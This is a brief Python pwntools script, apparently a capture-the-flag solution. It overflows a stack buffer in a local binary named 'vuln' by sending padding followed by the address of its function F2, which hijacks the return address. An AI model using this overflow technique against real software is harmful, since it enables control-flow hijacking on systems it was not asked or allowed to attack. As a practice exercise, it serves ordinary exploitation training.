#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *

io = process('./vuln')

elf = ELF('./vuln')
F2_addr = elf.symbols['F2']

payload = 'A' * (0x14 + 0x4) + p32(F2_addr)

io.sendline(payload)
print io.recvall()
io.close()

